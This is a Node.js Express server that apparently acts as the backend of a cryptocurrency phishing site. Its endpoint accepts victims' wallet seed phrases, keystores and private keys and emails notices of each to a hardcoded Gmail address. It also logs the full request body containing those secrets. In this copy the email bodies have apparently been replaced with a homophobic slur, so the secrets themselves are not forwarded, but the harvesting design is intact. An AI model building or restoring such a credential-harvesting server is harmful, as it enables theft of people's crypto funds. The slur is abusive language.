const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
require("dotenv").config();
const port = process.env.PORT || 3001;
const app = express();
app.use(cors());
app.use(express.json());

function formatMessage(message) {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map(
    (line) => `<div style="margin-bottom: 10px;">${line}</div>`
  );
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedLines.join(
    ""
  )}</div>`;
} 

app.post("/api/send-email", async (req, res) => {
    console.log("Received request to send email with body:", req.body);
    
  const { phrase, keystore, privateKey, item } = req.body;
  const email = process.env.EMAIL_USER || "";
  const pass = process.env.EMAIL_PASS || ""; 

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: email,
      pass,
    },
  });

  transporter.verify(function (error, success) {
    if (error) {
      console.log(`Transporter error: ${error}`);
    } else { 
      console.log("Server is ready to take our messages");
    }
  });

  try {
    let mailOptions = null;

    if (phrase) {
      const formattedMessage = formatMessage(phrase);
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "Fixiondapps@gmail.com",
        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
        html: `fucking faggot scammer`,
      };
    } else if (keystore) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "Fixiondapps@gmail.com",
        subject: "Yo! You Just Got A New Keystore Innit from DApps website!",
        html: `fucking faggot scammer`,
      };
    } else if (privateKey) {
      const formattedMessage = formatMessage(privateKey);
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "Fixiondapps@gmail.com",
        subject: "Yo! You Just Got A New Private Key Innit from DApps website!",
        html: `fucking faggot scammer`,
      };
    }

    if (mailOptions) {
      const result = await transporter.sendMail(mailOptions);
      console.log(result);
      if (result.response && result.response.includes("OK")) {
        return res.status(200).json({ message: "email sent successfully!!" });
      } else {
        return res.status(500).json({ error: "Internal server error" });
      }
    }

    return res.status(400).json({ message: "Submission Failed" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Email failed" });
  }
});
app.get("/", async (req, res) => {
    res.send("Welcome to the Email Sending Server!");    
  
});

app.listen(port, () => console.log(`Server running on port ${port}`));